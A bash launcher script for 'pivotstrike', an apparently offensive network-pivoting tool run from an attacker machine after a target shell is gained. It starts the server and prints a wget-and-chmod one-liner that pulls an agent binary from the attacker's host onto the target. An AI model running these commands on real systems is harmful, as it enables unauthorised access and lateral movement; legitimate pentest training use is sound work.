#!/bin/bash
# quickstart.sh — One command to go from "just got a shell" to "full pivot".
#
# Usage on attacker (Kali / exam VM):
#   sudo ./quickstart.sh
#
# What it does:
#   1. Detects your OS and architecture
#   2. Picks the right pivotstrike-server binary
#   3. Starts it with sane defaults
#   4. Prints the exact agent command for every target OS
#
# That's it. No pre-setup. No `ip tuntap add`. No `ip link set`. No thinking.
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
BOLD='\033[1m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DIST_DIR="${SCRIPT_DIR}/../dist"

# Check if running as root (needed for TUN)
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}Error: pivotstrike-server needs root to create the TUN interface.${NC}"
    echo -e "Run: ${BOLD}sudo $0${NC}"
    echo ""
    echo -e "Or if you only need SOCKS5 (no SYN scans):"
    echo -e "  ${BOLD}./pivotstrike-server --no-tun${NC}"
    exit 1
fi

# Detect OS/Arch
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)
case "$ARCH" in
    x86_64)  ARCH="amd64" ;;
    aarch64) ARCH="arm64" ;;
    armv*)   ARCH="arm" ;;
esac

SERVER_BIN="${DIST_DIR}/pivotstrike-server_${OS}_${ARCH}"
if [ ! -f "$SERVER_BIN" ]; then
    SERVER_BIN="${DIST_DIR}/pivotstrike-server"
fi
if [ ! -f "$SERVER_BIN" ]; then
    echo -e "${RED}Cannot find pivotstrike-server binary at $SERVER_BIN${NC}"
    echo "Run 'make cross' first to build all binaries."
    exit 1
fi

echo -e "${CYAN}"
echo '  ____  _            _   ____  _        _ _        '
echo ' |  _ \(_)_   _____ | |_/ ___|| |_ _ __(_) | _____ '
echo ' | |_) | \ \ / / _ \| __\___ \| __| '\''__| | |/ / _ \'
echo ' |  __/| |\ V / (_) | |_ ___) | |_| |  | |   <  __/'
echo ' |_|   |_| \_/ \___/ \__|____/ \__|_|  |_|_|\_\___|'
echo -e "${NC}"
echo -e "${BOLD}Starting pivotstrike-server with recommended settings...${NC}"
echo ""

# List agent binaries available for transfer
echo -e "${YELLOW}┌─ Agent binaries ready for deployment ─────────────────────────┐${NC}"
for agent_bin in "${DIST_DIR}"/pivotstrike-agent_*; do
    if [ -f "$agent_bin" ]; then
        size=$(du -h "$agent_bin" | cut -f1)
        name=$(basename "$agent_bin")
        echo -e "  ${name}  (${size})"
    fi
done
echo -e "${YELLOW}└───────────────────────────────────────────────────────────────┘${NC}"
echo ""
echo -e "${BOLD}Transfer agents via: python3 -m http.server 8888 -d ${DIST_DIR}${NC}"
echo -e "  wget http://<YOUR_IP>:8888/pivotstrike-agent_linux_amd64 -O /tmp/pa && chmod +x /tmp/pa"
echo ""
echo -e "${CYAN}Starting server...${NC}"
echo ""

exec "$SERVER_BIN" "$@"
